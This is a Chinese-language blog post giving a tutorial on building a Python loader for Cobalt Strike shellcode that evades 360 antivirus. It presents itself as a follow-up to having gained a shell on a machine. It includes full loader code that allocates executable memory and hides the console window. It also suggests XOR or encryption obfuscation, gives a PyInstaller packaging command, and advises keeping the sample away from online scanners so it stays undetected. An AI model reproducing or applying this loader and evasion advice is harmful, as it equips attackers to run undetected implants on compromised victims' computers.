# 用python做一个能过360的免杀CS马


<!--more-->
![IP定位](https://tool.lu/netcard/)
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script type="text/javascript">$(document).ready(function() {$("#begin_speak").click(function () {
                let content = $("#text").text();
                let msg = new SpeechSynthesisUtterance(content);
                window.speechSynthesis.speak(msg);$("#pause_speak").show();$("#cancel_speak").show();});$("#cancel_speak").click(function () {
                window.speechSynthesis.cancel();$("#pause_speak").hide();$("#resume_speak").hide();$(this).hide();
});$("#pause_speak").click(function () {
                window.speechSynthesis.pause();$("#resume_speak").show();
            });$("#resume_speak").click(function () {
                window.speechSynthesis.resume();$(this).hide();
            });
        });
</script>
   <body>
      <div>
         <input type="button" id="begin_speak"  value="朗读本文">
         <input type="button" id="pause_speak"  style="display:none" value="暂停朗读">
         <input type="button" id="cancel_speak" style="display:none" value="停止朗读">
         <input type="button" id="resume_speak" style="display:none" value="继续朗读">
      </div>
      <div id="text">
# [用python做一个能过360的免杀CS马](https://ybrc.github.io/zh-cn/11)

> 拿到shell了, 机器上有个360?? 
> 做个免杀吧!

> 更新: python真的不行...还是老老实实C++写吧 (

本文将通过python的`ctypes`库加载Cobalt Strike马实现免杀.

其实这已经不是一个新方法了; 但是它依然十分有效, 即使不做任何混淆也能过360.

### 写个python文件加载CS shellcode

shellcode写到内存中, 用`ctypes.windll`加载即可.

先用CS生成shellcode, Output类型选python

[![360-gen-payload.webp](https://leohearts.com/usr/uploads/2020/10/184615255.webp)](https://leohearts.com/usr/uploads/2020/10/184615255.webp)

然后放进这份[网传的python代码中](https://www.secshi.com/6590.html), 替换掉buf.

```python
from ctypes import *
import ctypes
buf =  ""
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
def executable_code(buffer):
    buf = c_char_p(buffer)
    size = len(buffer)
    addr = libc.valloc(size)
    addr = c_void_p(addr)
    if 0 == addr: 
        raise Exception("Failed to allocate memory")
    memmove(addr, buf, size)
    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):
        raise Exception("Failed to set protection on buffer")
    return addr
VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc
VirtualProtect = ctypes.windll.kernel32.VirtualProtect
shellcode = bytearray(buf)
whnd = ctypes.windll.kernel32.GetConsoleWindow()   
if whnd != 0:
       if 1:
              ctypes.windll.user32.ShowWindow(whnd, 0)   
              ctypes.windll.kernel32.CloseHandle(whnd)
memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
old = ctypes.c_long(1)
VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)),0x40,ctypes.byref(old))
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
shell()
```

Python

> 记得全程用python2. python3.9因未知原因失败了.

它运行一下就可以CS上线了.

### 混淆/编码

不编码也能过360, 不过还是编码一下比较保险一些.

你可以尝试:

- 编码shellcode
- 编码整个程序然后exec
- etc...

可以对每个byte异或一个字符, 或者上加密.

### 用PyInstaller打包成exe

很简单,

```shell
pyinstaller.exe --onefile -w ./payload.py
```

Shell

即可.

**注意: 如果你编码了程序, 记得在最外层import所有需要的库, 否则执行时会因为找不到库而出错.**

**不要在联网状态下扫描你的程序, 不然第二天它就挂了(**

是这样...
第二天挂了之后, 再尝试换个花样上去几分钟就被360杀了, 可能360记录了我的ip之类的.
考虑上cloudflare转发?

VT结果: https://www.virustotal.com/gui/file/3a2c7ca6533139de0d727649e554e507ec5af4066d3753bfa71f93be613990e6/detection
</div>
<img src="https://tool.lu/netcard/">



{{<music url="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/Music/66.mp3" name="" artist="Mr·Yang" cover="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@img/avatar.png" fixed="true" volume="100" loop="all" autoplay="true" preload="auto" >}}
<script type='text/javascript' src="//libs.cdnjs.net/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
<div id="qrcode"></div> 
<a id="download" download="qrcode.jpg"></a>
<div id="btn" style="margin: 0 auto; text-align: center;">
<button id="save"><b>手机扫一扫</b></button>
</div>
<script type="text/javascript">
    jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : "#000000",
	colorLight : "#ffffff", text: window.location.href });$("#save").click(function () {
        var canvas = $('#qrcode').find("canvas").get(0);
        var url = canvas.toDataURL('image/jpeg');$("#download").attr('href', url).get(0).click();
        return false;
    });
</script>
